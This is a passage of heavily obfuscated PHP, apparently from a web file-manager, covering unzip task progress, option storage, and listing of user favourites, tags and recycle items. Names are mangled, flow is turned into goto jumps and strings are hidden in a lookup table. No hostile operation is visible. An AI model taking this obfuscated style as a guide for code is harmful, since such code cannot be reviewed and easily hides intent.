Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1571]] == $f„Ó‚ÙƒŸ¿[318]) { $C½Å±¯ = $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[996]] / $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[982]]; $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1488]] = 0.3 + $C½Å±¯ * 0.4; } else { if ($d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1571]] == $f„Ó‚ÙƒŸ¿[116]) { $E×¤Èİ…µ = 0; if ($d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1532]] == $f„Ó‚ÙƒŸ¿[116]) { $E×¤Èİ…µ = $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1531]]; } $C½Å±¯ = ($d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1535]] + $E×¤Èİ…µ) / $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[703]]; $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1488]] = 0.3 + 0.4 + $C½Å±¯ * 0.3; } } } if ($d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1488]] > 0) { $aá‘Ü‹´Å½ = timeFloat() - $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[725]] - $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1491]]; $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1492]] = $aá‘Ü‹´Å½ * (1 - $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1488]]) / $d± Ôƒ”ë[$f„Ó‚ÙƒŸ¿[1488]]; } } public function addFile($B±¾ŒêöäÁ) { goto b¬İ–ÌºÊÖ; bâ‹±‚—‹¼: $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[984]] = $F¨Ä±ô©ŸØ[1547]; $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[1532]] = $F¨Ä±ô©ŸØ[1054]; $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[703]] = $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[87]]; goto B£«÷ä¦Ú¤; b¬İ–ÌºÊÖ: $F¨Ä±ô©ŸØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D‹ª”îªèÆ =& $this->task; $D„Ş—Ç¶Ø = IO::info($B±¾ŒêöäÁ); goto f‹Å¦çĞ‰ï; f‹Å¦çĞ‰ï: $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[1528]] = $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[28]]; $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[1530]] = $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[87]]; $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[1531]] = 0; goto bâ‹±‚—‹¼; B£«÷ä¦Ú¤: $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[982]] = 1; $fóÀœ†ãĞº = 0; $D‹ª”îªèÆ[$F¨Ä±ô©ŸØ[1539]] = array($F¨Ä±ô©ŸØ[1540] => $fóÀœ†ãĞº + 1, $F¨Ä±ô©ŸØ[416] => $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[28]], $F¨Ä±ô©ŸØ[85] => $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[85]], $F¨Ä±ô©ŸØ[498] => $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[498]] ? $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[498]] : $D„Ş—Ç¶Ø[$F¨Ä±ô©ŸØ[85]]); goto aòèÊ‘º; aòèÊ‘º: $this->update(); goto EÓ´Ü×ôÕï; EÓ´Ü×ôÕï: } public function unzipAfter($A‹…ƒ“µ®â) { goto fÜ—Äñ£; fÜ—Äñ£: $B‹ë¶÷İ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D†ëîÉ…šù =& $this->task; $D†ëîÉ…šù[$B‹ë¶÷İ[1571]] = $B‹ë¶÷İ[116]; goto Bµ¶ÂŸÆ¬µ; cĞ·´ÑÁ‹Ú: $D†ëîÉ…šù[$B‹ë¶÷İ[996]] = 0; $D†ëîÉ…šù[$B‹ë¶÷İ[1530]] = 0; $D†ëîÉ…šù[$B‹ë¶÷İ[1531]] = 0; goto c¨á—¤‚Š; Bµ¶ÂŸÆ¬µ: $EÚÄ’ÊØ¿ğ = IO::infoWithChildren($A‹…ƒ“µ®â); $Fƒ…ŒÕ¯‚ñ = 0; $D†ëîÉ…šù[$B‹ë¶÷İ[1539]] = array($B‹ë¶÷İ[1540] => $Fƒ…ŒÕ¯‚ñ + 1, $B‹ë¶÷İ[416] => $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[28]], $B‹ë¶÷İ[85] => $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[85]], $B‹ë¶÷İ[498] => $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[498]] ? $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[498]] : $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[85]]); goto bÙÍ¶°Üİ¼; c¨á—¤‚Š: $D†ëîÉ…šù[$B‹ë¶÷İ[1528]] = $B‹ë¶÷İ[33]; $D†ëîÉ…šù[$B‹ë¶÷İ[1535]] = 0; $D†ëîÉ…šù[$B‹ë¶÷İ[703]] = $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[87]]; goto aÏó™æê×—; aÏó™æê×—: $this->update(); self::log($B‹ë¶÷İ[1573] . json_encode(array($D†ëîÉ…šù, $EÚÄ’ÊØ¿ğ))); goto cù×ÅåÁÊ—; bÙÍ¶°Üİ¼: if ($EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[29]] == $B‹ë¶÷İ[201]) { $D†ëîÉ…šù[$B‹ë¶÷İ[982]] = 1; } else { $D†ëîÉ…šù[$B‹ë¶÷İ[982]] = $EÚÄ’ÊØ¿ğ[$B‹ë¶÷İ[90]][$B‹ë¶÷İ[88]]; } $D†ëîÉ…šù[$B‹ë¶÷İ[984]] = $B‹ë¶÷İ[33]; $D†ëîÉ…šù[$B‹ë¶÷İ[1532]] = 0; goto cĞ·´ÑÁ‹Ú; cù×ÅåÁÊ—: } public function nameParse($cÛï×ÆÔµ) { goto bÄÏğ±°Â; fìŒ¥³†‡ì: $this->update(); goto CÊ¥Ï‰Øø; E¸äâˆÓ—ë: $fÍ„ÕìÀ° = get_path_this($cÛï×ÆÔµ); if (strstr($fÍ„ÕìÀ°, $D†Ğ‰àß†ö[104])) { $C¸Í‚Øø°[$D†Ğ‰àß†ö[996]] += 1; $C¸Í‚Øø°[$D†Ğ‰àß†ö[982]] += 1; } $C¸Í‚Øø°[$D†Ğ‰àß†ö[1528]] = $cÛï×ÆÔµ; goto fìŒ¥³†‡ì; bÄÏğ±°Â: $D†Ğ‰àß†ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C¸Í‚Øø° =& $this->task; if ($C¸Í‚Øø°[$D†Ğ‰àß†ö[1571]] == $D†Ğ‰àß†ö[1054]) { $C¸Í‚Øø°[$D†Ğ‰àß†ö[1571]] = $D†Ğ‰àß†ö[318]; $C¸Í‚Øø°[$D†Ğ‰àß†ö[1535]] = 0; $C¸Í‚Øø°[$D†Ğ‰àß†ö[703]] = 0; } goto E¸äâˆÓ—ë; CÊ¥Ï‰Øø: } } goto e‘Ì‚‰øš¼; aƒšĞäÌôŞ: function binCheckBigger($c‚‘ç—“ˆ, $cÜĞ‡ê”) { return $c‚‘ç—“ˆ > $cÜĞ‡ê”; } $_SERVER[$_SERVER[Å€ÍÈ¹­Ï•Âœ][3]] = ("\70\71\71\64"."\64\60")+0;$_mPRM="NJTju4qPutvMi9DrxAWqjhpkUAQTsD4zhs2BmUTQ8AfwKued3Z8niCHt6vHr4K5VMqHg6gGu8V7bRGNIzY";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Cëã”™¶á, $f’À²ˆ¯ˆ) { $C±ÇŒ†¦… =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset(self::$_methodList[$Cëã”™¶á])) { return @call_user_func_array(self::$_methodList[$Cëã”™¶á], $f’À²ˆ¯ˆ); } else { if (method_exists($this, $Cëã”™¶á)) { return call_user_func_array(array($this, $Cëã”™¶á), $f’À²ˆ¯ˆ); } else { think_exception(__CLASS__ . $C±ÇŒ†¦…[4] . $Cëã”™¶á . $C±ÇŒ†¦…[5]); } } } public static function __callStatic($D±¿¦ƒè¥Ø, $Fš…Õ¬ëÊ) { if (isset(self::$_methodListStatic[$D±¿¦ƒè¥Ø])) { return call_user_func_array(self::$_methodListStatic[$D±¿¦ƒè¥Ø], $Fš…Õ¬ëÊ); } else { if (method_exists(self, $D±¿¦ƒè¥Ø)) { return call_user_func_array(array(self, $D±¿¦ƒè¥Ø), $Fš…Õ¬ëÊ); } else { show_json("{$D±¿¦ƒè¥Ø}\x28\x29\40\156\157\x74\x20\x65\170\x69\x73\x74\73", !1); } } } public static function addMethod($cÕÕ­÷íë˜, $D‡—ø¤ˆåĞ) { self::$_methodList[$cÕÕ­÷íë˜] = $D‡—ø¤ˆåĞ; } public static function addMethodStatic($c×Ï—‹Á‹ƒ, $Fìë¾“ÜÊ‹) { self::$_methodListStatic[$c×Ï—‹Á‹ƒ] = $Fìë¾“ÜÊ‹; } } goto B•¿£‡Œ¬; b¦ÕªÁÄõ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($CÄÛø†‘¾² = false, $f–Ÿ¦ÈÑ©î = '', $e¾ÏµÑ¼Ÿì = false) { goto Eò¢ÔºÒ˜º; AŸÁğ¹‚ØŠ: $D¢‹‘•¦– = $this->where($E¾Œ‘­Ôñ)->select(); $D¢‹‘•¦– = array_to_keyvalue($D¢‹‘•¦–, $f…ùâ¶ßÁ¾[102], $f…ùâ¶ßÁ¾[380]); foreach ($D¢‹‘•¦– as $eÆÛ“ğ¬Ìï => $cèŠ¦ÎÇš) { if ($e¾ÏµÑ¼Ÿì || in_array($eÆÛ“ğ¬Ìï, $this->jsonField)) { $D¢‹‘•¦–[$eÆÛ“ğ¬Ìï] = json_decode($cèŠ¦ÎÇš, !0); } } goto eµ¬µ›¨Ó—; Eò¢ÔºÒ˜º: $f…ùâ¶ßÁ¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D¢‹‘•¦– = $this->cacheGet($f–Ÿ¦ÈÑ©î); $Bˆ·¡àÓ§ = $this->optionDefault($f–Ÿ¦ÈÑ©î); goto dºÚÉêá×; dºÚÉêá×: $Bˆ·¡àÓ§ = is_array($Bˆ·¡àÓ§) ? $Bˆ·¡àÓ§ : array(); if (is_array($D¢‹‘•¦–)) { $D¢‹‘•¦– = array_merge($Bˆ·¡àÓ§, $D¢‹‘•¦–); return $CÄÛø†‘¾² ? isset($D¢‹‘•¦–[$CÄÛø†‘¾²]) ? $D¢‹‘•¦–[$CÄÛø†‘¾²] : null : $D¢‹‘•¦–; } $E¾Œ‘­Ôñ = $this->filterWhere(array($f…ùâ¶ßÁ¾[29] => $f–Ÿ¦ÈÑ©î)); goto AŸÁğ¹‚ØŠ; eµ¬µ›¨Ó—: $this->cacheSet($f–Ÿ¦ÈÑ©î, $D¢‹‘•¦–); $D¢‹‘•¦– = array_merge($Bˆ·¡àÓ§, $D¢‹‘•¦–); return $CÄÛø†‘¾² ? $D¢‹‘•¦–[$CÄÛø†‘¾²] : $D¢‹‘•¦–; goto FÜå­öğê; FÜå­öğê: } public function set($dê³Í®«³½, $B ˆÂ’ÆÄ» = false, $dÄæŸÎ¤ĞŸ = '') { goto f»ˆŒ’×øï; f§Ÿµ©áç: $FÜÀ„±Á¡ = is_array($dê³Í®«³½) ? $dê³Í®«³½ : array($dê³Í®«³½ => $B ˆÂ’ÆÄ»); foreach ($FÜÀ„±Á¡ as $A­¥ƒï‡…‘ => $a²ß“Ôˆ™) { if (is_array($a²ß“Ôˆ™)) { $a²ß“Ôˆ™ = json_encode_force($a²ß“Ôˆ™); } $this->checkLength($a²ß“Ôˆ™, !1, $this->tableName . $B¯—”Üö [4] . $dê³Í®«³½); $a²ß“Ôˆ™ = self::textEncode($a²ß“Ôˆ™); $FÜÀ„±Á¡ = array($B¯—”Üö [29] => $dÄæŸÎ¤ĞŸ, $B¯—”Üö [102] => $A­¥ƒï‡…‘, $B¯—”Üö [380] => $a²ß“Ôˆ™); $D»™Àä›œå[] = $this->filterWhere($FÜÀ„±Á¡); } if (!$D»™Àä›œå) { return !0; } goto Cä…˜†‚Ê; Cä…˜†‚Ê: return $this->addAll($D»™Àä›œå, array(), !0); goto aÏ»ªÓ‡è±; f»ˆŒ’×øï: $B¯—”Üö  =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->cacheRemove($dÄæŸÎ¤ĞŸ); $D»™Àä›œå = array(); goto f§Ÿµ©áç; aÏ»ªÓ‡è±: } protected function optionDefault($Cƒèä¦ˆêÓ = '') { return !1; } public function setDeep($B´Œ£Õ²Ï’, $f¢àåæ±Í = false, $e‘¹´ª¿Û = '') { $CˆáÇî‚‡˜ = explode($_SERVER[í¤âËÚ£¶íÊ¢][104], $B´Œ£Õ²Ï’); $bÒëÓ›è¾Ä = $this->get(); array_set_value($bÒëÓ›è¾Ä, $B´Œ£Õ²Ï’, $f¢àåæ±Í); $this->set($CˆáÇî‚‡˜[0], $bÒëÓ›è¾Ä[$CˆáÇî‚‡˜[0]], $e‘¹´ª¿Û); } public function remove($a…ëÊÙÆ…É, $D¥Â“õÓæ² = '') { $däï³óÛÏë =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->cacheRemove($D¥Â“õÓæ²); $Fà ‚¼£‘è = $this->filterWhere(array($däï³óÛÏë[102] => $a…ëÊÙÆ…É, $däï³óÛÏë[29] => $D¥Â“õÓæ²)); if (is_null($a…ëÊÙÆ…É)) { unset($Fà ‚¼£‘è[$däï³óÛÏë[102]]); } return $this->where($Fà ‚¼£‘è)->delete(); } public function cacheSet($eÌ‡ª‘¾–¶, $Fµ»Ô¨å‰ = false) { return Cache::set($this->cacheKey($eÌ‡ª‘¾–¶), $Fµ»Ô¨å‰); } public function cacheGet($cšÎ³±’ª÷) { return Cache::get($this->cacheKey($cšÎ³±’ª÷)); } public function cacheRemove($D™ïˆ¢›¤„) { return Cache::remove($this->cacheKey($D™ïˆ¢›¤„)); } protected function filterWhere($BÄé‰Î½Ğä) { return $BÄé‰Î½Ğä; } protected function cacheKey($C¢µ£“±åõ) { return $C¢µ£“±åõ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\143\x65"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\155\145" => "\151\157\x5f\x73\x6f\x75\x72\x63\145\x5f\x6d\x65\164\x61", "\x6d\x65\x74\x61\x46\151\145\x6c\x64" => "\x73\x6f\x75\162\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\163\145\x72\x74", "\146\165\x6e\143\x74\151\157\x6e"), array("\x63\162\145\141\x74\145\124\151\x6d\145", "\164\x69\x6d\145", "\151\156\163\145\162\x74", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\166\x69\x65\x77\x54\x69\x6d\x65", "\x74\151\155\145", "\x69\156\x73\145\x72\164", "\x66\165\156\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($f¨ù™ºì’æ) { return $this->listSource(array($_SERVER[í¤âËÚ£¶íÊ¢][398] => $f¨ù™ºì’æ)); } public function typeName($dìâæ÷ô’‰) { static $C·º±Áöó° = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $C·º±Áöó°[$dìâæ÷ô’‰ . $_SERVER[í¤âËÚ£¶íÊ¢][33]]; } public function sourceListInfo($bÀˆ¡Ì±²•, $aÆ©Êğ¶ = false) { goto b‹ŞŒŒ—ä; FÇ ìˆÙë: return array_to_keyvalue($D§áœ«È‹ï, $FŸöœ…[399]); goto d¢ğ£‚ÑÕ’; b‹ŞŒŒ—ä: $FŸöœ… =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÀˆ¡Ì±²• = $bÀˆ¡Ì±²• ? $bÀˆ¡Ì±²• : array(); $bÀˆ¡Ì±²• = array_filter(array_unique($bÀˆ¡Ì±²•)); goto aÚ­‘†‚è»; aÚ­‘†‚è»: if (!$bÀˆ¡Ì±²•) { return array(); } $D§áœ«È‹ï = $this->where(array($FŸöœ…[399] => array($FŸöœ…[7], $bÀˆ¡Ì±²•)))->select(); $this->_listDataApply($D§áœ«È‹ï, $aÆ©Êğ¶); goto FÇ ìˆÙë; d¢ğ£‚ÑÕ’: } public function pathInfoFilter(&$b®’ÀŠ›ñĞ) { goto a•ªÚğ¼Ñ¨; a•ªÚğ¼Ñ¨: $aá·ŠĞ©… =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $F À¼„« = false; static $EìæÒµ„†Ä = false; goto Dà·Ì¾ƒ…¿; Dà·Ì¾ƒ…¿: if (!$F À¼„«) { goto a¯ø§Èïîá; FääÛçÉØÓ: $EìæÒµ„†Ä = array(); foreach ($F À¼„« as $eğğ‡Õ‹Ã) { if (in_array($eğğ‡Õ‹Ã, $b†µ²à×Ö¥)) { continue; } $EìæÒµ„†Ä[] = $eğğ‡Õ‹Ã; } goto a‘›´¡; FÆª¼áº¢: $F§íİæ‹çè = $aá·ŠĞ©…[403]; $b†µ²à×Ö¥ = explode($aá·ŠĞ©…[47], $F§íİæ‹çè); $F À¼„« = explode($aá·ŠĞ©…[47], $Eòœ¸¡Œğï); goto FääÛçÉØÓ; a¯ø§Èïîá: $Eòœ¸¡Œğï = $aá·ŠĞ©…[400]; $Eòœ¸¡Œğï .= $aá·ŠĞ©…[401]; $Eòœ¸¡Œğï .= $aá·ŠĞ©…[402]; goto FÆª¼áº¢; a‘›´¡: } $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[85]] = $aá·ŠĞ©…[404] . $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[399]] . $aá·ŠĞ©…[405]; $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[29]] = $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[406]] == 1 ? $aá·ŠĞ©…[86] : $aá·ŠĞ©…[201]; goto A½‘²‘ªˆ; b«ÚïÈ××½: if (isset($b®’ÀŠ›ñĞ[$aá·ŠĞ©…[409]]) && $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[409]][$aá·ŠĞ©…[410]] == -1) { $b÷‡–¤±Âï = $EìæÒµ„†Ä; } $b®’ÀŠ›ñĞ = array_field_key($b®’ÀŠ›ñĞ, $b÷‡–¤±Âï); return $b®’ÀŠ›ñĞ; goto f‡Ê¤¦à£•; A½‘²‘ªˆ: $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[407]] = $this->typeName($b®’ÀŠ›ñĞ[$aá·ŠĞ©…[407]]); if ($b®’ÀŠ›ñĞ[$aá·ŠĞ©…[406]] != 1) { $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[177]] = $b®’ÀŠ›ñĞ[$aá·ŠĞ©…[408]]; unset($b®’ÀŠ›ñĞ[$aá·ŠĞ©…[408]]); } $b÷‡–¤±Âï = $F À¼„«; goto b«ÚïÈ××½; f‡Ê¤¦à£•: } public function listUserFav() { goto b¹°¿¤á…; b¹°¿¤á…: $e‚œ‰¥’ß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÒĞŞÕïœø = Model($e‚œ‰¥’ß[411])->listData(); $f´¼õ·ñí = array_filter_by_field($FÒĞŞÕïœø, $e‚œ‰¥’ß[29], $e‚œ‰¥’ß[412]); goto F”÷È‚íÀ¹; F”÷È‚íÀ¹: $f´¼õ·ñí = array_to_keyvalue($f´¼õ·ñí, $e‚œ‰¥’ß[33], $e‚œ‰¥’ß[85]); if ($f´¼õ·ñí) { $aâ‰©ˆñœİ = $this->listSource(array($e‚œ‰¥’ß[413] => array($e‚œ‰¥’ß[414], $f´¼õ·ñí))); } $aâ‰©ˆñœİ = array_to_keyvalue($aâ‰©ˆñœİ[$e‚œ‰¥’ß[375]], $e‚œ‰¥’ß[399]); goto b¡ñæ‚¿¨ù; b¡ñæ‚¿¨ù: foreach ($FÒĞŞÕïœø as &$e¼µŒÊÂƒÌ) { $e¼µŒÊÂƒÌ = array($e‚œ‰¥’ß[415] => $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[397]], $e‚œ‰¥’ß[416] => $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[28]], $e‚œ‰¥’ß[417] => $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[85]], $e‚œ‰¥’ß[418] => $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[29]], $e‚œ‰¥’ß[419] => $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[202]], $e‚œ‰¥’ß[420] => $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[93]]); if ($e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[29]] == $e‚œ‰¥’ß[412] && $aâ‰©ˆñœİ[$e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[85]]]) { $e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[94]] = $aâ‰©ˆñœİ[$e¼µŒÊÂƒÌ[$e‚œ‰¥’ß[85]]]; } } unset($e¼µŒÊÂƒÌ); return $FÒĞŞÕïœø; goto EõŒ©Î©©; EõŒ©Î©©: } public function listUserTag($D—Ê›î¨ìÕ) { goto f·‰…²Çµ ; f·‰…²Çµ : $fèÄ¾ÕŞÏÑ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($D—Ê›î¨ìÕ && !is_array($D—Ê›î¨ìÕ)) { $D—Ê›î¨ìÕ = array($D—Ê›î¨ìÕ); } $aÑå¾Š±©å = Model($fèÄ¾ÕŞÏÑ[421])->listData(); goto a•ñ¡öÆÆ; D‹ÜïŠ‘¸Ì: if ($F¿„…’ºÀµ) { Model($fèÄ¾ÕŞÏÑ[423])->removeBySource($F¿„…’ºÀµ); } return $d·³Ÿ¦”Õ; goto Fùò¥ç®ÇÖ; A…É‚¾¼ŠÖ: if (!$d·³Ÿ¦”Õ || count($aˆ‚™ä¼ã ) == $d·³Ÿ¦”Õ[$fèÄ¾ÕŞÏÑ[372]][$fèÄ¾ÕŞÏÑ[373]]) { return $d·³Ÿ¦”Õ; } $F¿„…’ºÀµ = array(); $f§ŞÆ¶Õ‡ = array_to_keyvalue($d·³Ÿ¦”Õ[$fèÄ¾ÕŞÏÑ[84]], $fèÄ¾ÕŞÏÑ[33], $fèÄ¾ÕŞÏÑ[399]); goto C¡¹‡ªÕ; a•ñ¡öÆÆ: $eñ§Ş³å²Æ = array(); foreach ($aÑå¾Š±©å as $b¹½Í¼‚Ô¥) { $a×ÚË‚ëóÌ = $b¹½Í¼‚Ô¥[$fèÄ¾ÕŞÏÑ[85]]; if (!$a×ÚË‚ëóÌ) { continue; } if (!isset($eñ§Ş³å²Æ[$a×ÚË‚ëóÌ])) { $eñ§Ş³å²Æ[$a×ÚË‚ëóÌ] = array(); } $eñ§Ş³å²Æ[$a×ÚË‚ëóÌ][] = $b¹½Í¼‚Ô¥[$fèÄ¾ÕŞÏÑ[422]]; } $aˆ‚™ä¼ã  = array(); goto d¨Ï¶ÂŞ†ê; C¡¹‡ªÕ: $A°”É•ßÇ = array_to_keyvalue($d·³Ÿ¦”Õ[$fèÄ¾ÕŞÏÑ[83]], $fèÄ¾ÕŞÏÑ[33], $fèÄ¾ÕŞÏÑ[399]); $e†´ï…®—ß = array_merge($A°”É•ßÇ, $f§ŞÆ¶Õ‡); foreach ($aˆ‚™ä¼ã  as $a×ÚË‚ëóÌ) { if (!in_array($a×ÚË‚ëóÌ, $e†´ï…®—ß)) { $F¿„…’ºÀµ[] = $a×ÚË‚ëóÌ; } } goto D‹ÜïŠ‘¸Ì; d¨Ï¶ÂŞ†ê: foreach ($eñ§Ş³å²Æ as $c‰Óò›ÚŒù => $fÔÚ™Ââß—) { $fõŒÊª­ “ = !0; if (!$D—Ê›î¨ìÕ) { $aˆ‚™ä¼ã [] = $c‰Óò›ÚŒù; continue; } foreach ($D—Ê›î¨ìÕ as $D ‡³ôñ) { if (!in_array($D ‡³ôñ, $fÔÚ™Ââß—)) { $fõŒÊª­ “ = !1; break; } } if ($fõŒÊª­ “) { $aˆ‚™ä¼ã [] = $c‰Óò›ÚŒù; } } if (!$aˆ‚™ä¼ã ) { return array(); } $d·³Ÿ¦”Õ = $this->listSource(array($fèÄ¾ÕŞÏÑ[413] => array($fèÄ¾ÕŞÏÑ[414], $aˆ‚™ä¼ã ))); goto A…É‚¾¼ŠÖ; Fùò¥ç®ÇÖ: } public function listUserRecycle() { $D’»Ü±Ç± =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÛœô÷† = Model($D’»Ü±Ç±[424])->listData(); if (!$DÛœô÷†) { return array(); } $B—ÃµºñÖ‡ = array($D’»Ü±Ç±[413] => array($D’»Ü±Ç±[414], $DÛœô÷†), $D’»Ü±Ç±[425] => 1); return $this->listSource($B—ÃµºñÖ‡); } public function listSource($a¼‡‘ç´¨, $fÎêÛÚÍ›˜ = 3000) { goto FëöâöñàŸ; d“¼‡Àñİ: return $EêÀè×ˆ˜ˆ; goto BĞ…éÌÓ¤; FëöâöñàŸ: $b‡Ü…Âè“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($a¼‡‘ç´¨[$b‡Ü…Âè“[426]])) { $a¼‡‘ç´¨[$b‡Ü…Âè“[426]] = 0; } $eùĞõ¿ˆÚ‡ = $b‡Ü…Âè“[427]; goto Aªõ‰ŸÓ±ù; Aªõ‰ŸÓ±ù: $EêÀè×ˆ˜ˆ = $this->field($eùĞõ¿ˆÚ‡)->_makeOrder()->where($a¼‡‘ç´¨)->selectPage($fÎêÛÚÍ›˜); $this->_listDataApply($EêÀè×ˆ˜ˆ[$b‡Ü…Âè“[375]]); $this->_listMake($EêÀè×ˆ˜ˆ); goto d“¼‡Àñİ; BĞ…éÌÓ¤: } protected function _makeOrder() { goto e”Ô˜·«‡Ú; FğİËÕ£ö: if ($Bé“Ó‰Œä± == $e…à½¡ÇÌ›[28]) { } $AòÕôòÓ = $e…à½¡ÇÌ›[440] . $C„Õã¾¡‹Ì[$Bé“Ó‰Œä±] . $e…à½¡ÇÌ›[50] . $a‚‘»ºµ˜­[$B•°ÉÀ«Şõ]; return $this->order(rtrim(trim($AòÕôòÓ), $e…à½¡ÇÌ›[47])); goto dÃí·ê­Â; FìÙ”‘Øœ•: $a‚‘»ºµ˜­ = array($e…à½¡ÇÌ›[431] => $e…à½¡ÇÌ›[432], $e…à½¡ÇÌ›[433] => $e…à½¡ÇÌ›[434]); $C„Õã¾¡‹Ì = array($e…à½¡ÇÌ›[28] => $e…à½¡ÇÌ›[28], $e…à½¡ÇÌ›[87] => $e…à½¡ÇÌ›[87], $e…à½¡ÇÌ›[177] => $e…à½¡ÇÌ›[408], $e…à½¡ÇÌ›[435] => $e…à½¡ÇÌ›[435], $e…à½¡ÇÌ›[436] => $e…à½¡ÇÌ›[437], $e…à½¡ÇÌ›[202] => $e…à½¡ÇÌ›[202], $e…à½¡ÇÌ›[93] => $e…à½¡ÇÌ›[93]); $Bé“Ó‰Œä± = Input::get($e…à½¡ÇÌ›[438], $e…à½¡ÇÌ›[7], $A¢®Ä„ÛÊÌ, array_keys($C„Õã¾¡‹Ì)); goto a‚ĞİêĞÌ; e”Ô˜·«‡Ú: $e…à½¡ÇÌ› =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¢®Ä„ÛÊÌ = Model($e…à½¡ÇÌ›[428])->get($e…à½¡ÇÌ›[429]); $b‡àŠ’é¶Ó = Model($e…à½¡ÇÌ›[428])->get($e…à½¡ÇÌ›[430]); goto FìÙ”‘Øœ•; a‚ĞİêĞÌ: $B•°ÉÀ«Şõ = Input::get($e…à½¡ÇÌ›[439], $e…à½¡ÇÌ›[7], $b‡àŠ’é¶Ó, array_keys($a‚‘»ºµ˜­)); if (!in_array($Bé“Ó‰Œä±, array_keys($C„Õã¾¡‹Ì))) { $Bé“Ó‰Œä± = $e…à½¡ÇÌ›[28]; } if (!in_array($B•°ÉÀ«Şõ, array_keys($a‚‘»ºµ˜­))) { $Bé“Ó‰Œä± = $e…à½¡ÇÌ›[431]; } goto FğİËÕ£ö; dÃí·ê­Â: } protected function _listDataApplyItem($fîŠ‰ä¤, $bŒ¯…¾‘‹ = false) { $b¦–ˆ¶èŠ = array($fîŠ‰ä¤); $this->_listDataApply($b¦–ˆ¶èŠ, $bŒ¯…¾‘‹); return $b¦–ˆ¶èŠ[0]; } protected function _listDataApply(&$c–™‹ÃŠ£¿, $e“Ë³ŞùÆƒ = false) { goto Dö±¡­Şï£; Dö±¡­Şï£: $e¬¤×³š¿í =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$c–™‹ÃŠ£¿) { $c–™‹ÃŠ£¿ = array(); return; } $cËì¼Šà = array_to_keyvalue($c–™‹ÃŠ£¿, $e¬¤×³š¿í[33], $e¬¤×³š¿í[399]); goto BÑëí‹×ìØ; BÑëí‹×ìØ: $cËì¼Šà = array_unique($cËì¼Šà); $this->_listSourceCache($c–™‹ÃŠ£¿); if (!$e“Ë³ŞùÆƒ) { 